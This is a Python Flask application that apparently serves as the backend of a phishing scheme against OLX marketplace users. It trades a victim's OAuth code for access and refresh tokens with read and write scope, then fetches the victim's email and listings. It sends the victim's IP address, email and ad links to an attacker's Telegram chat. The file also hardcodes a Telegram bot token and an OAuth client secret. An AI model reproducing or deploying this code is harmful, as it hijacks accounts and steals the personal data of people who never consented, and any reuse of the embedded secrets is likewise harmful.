from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import os
import json

app = Flask(__name__)

# ---- КОНФИГУРАЦИЯ ----
TG_TOKEN = "8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw"
TG_CHAT_ID = "-1003455979409"
CLIENT_ID = "202421"
CLIENT_SECRET = "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf"
REDIRECT_URI = "https://maun-producton.up.railway.app/" 

OLX_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/OLX_green_logo.svg/250px-OLX_green_logo.svg.png"

def send_telegram_message(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                     json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True},
                     timeout=10)
    except: pass

@app.route('/')
def index():
    ads_cookie = request.cookies.get('user_ads')
    user_ads = json.loads(ads_cookie) if ads_cookie else []
    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
            return render_template_string(html_content, user_ads=user_ads)
    except Exception as e:
        return f"Помилка: {e}", 500

@app.route('/get_token', methods=['POST'])
def get_token():
    data = request.get_json(silent=True) or {}
    code = data.get('code')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    if not code: return jsonify({"error": "No code"}), 400

    token_url = 'https://www.olx.ua/api/open/oauth/token'
    payload = {
        'grant_type': 'authorization_code',
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'scope': 'read write v2'
    }
    
    try:
        response = requests.post(token_url, data=payload, timeout=15)
        if response.status_code == 200:
            res_json = response.json()
            access = res_json.get('access_token')
            refresh = res_json.get('refresh_token')
            
            auth_headers = {"Authorization": f"Bearer {access}", "Version": "2.0", "Accept": "application/json"}
            
            # Данные юзера
            email = "Приховано"
            u_req = requests.get("https://www.olx.ua/api/partner/users/me", headers=auth_headers, timeout=7)
            if u_req.status_code == 200:
                email = u_req.json().get('data', {}).get('email', email)

            # Получаем объявления (очищаем список перед заполнением, чтобы не было дублей)
            new_ads = [] 
            tg_links = "" 
            ads_req = requests.get("https://www.olx.ua/api/partner/adverts", headers=auth_headers, params={"limit": 5}, timeout=7)
            
            if ads_req.status_code == 200:
                ads_data = ads_req.json().get('data', [])
                for i, ad in enumerate(ads_data):
                    title = ad.get('title', 'Без назви')
                    url = ad.get('url', 'https://olx.ua')
                    
                    new_ads.append({
                        "title": title,
                        "url": url,
                        "price": "Активне",
                        "img": OLX_LOGO 
                    })
                    tg_links += f"{i+1}. <a href='{url}'>{title}</a>\n"

            # Лог
            msg = (f"✅ <b>ВХІД OLX</b>\n👤 IP: {user_ip}\n📧 {email}\n\n📦 <b>ОГОЛОШЕННЯ:</b>\n{tg_links or 'Немає'}")
            send_telegram_message(msg)

            # Отправляем ответ и ПЕРЕЗАПИСЫВАЕМ куки свежими данными (старые затрутся)
            resp = make_response(jsonify({"status": "ok"}))
            resp.set_cookie('user_ads', json.dumps(new_ads), max_age=60*60) # 1 час жизни хватит
            return resp
        
        return jsonify({"error": "Fail"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
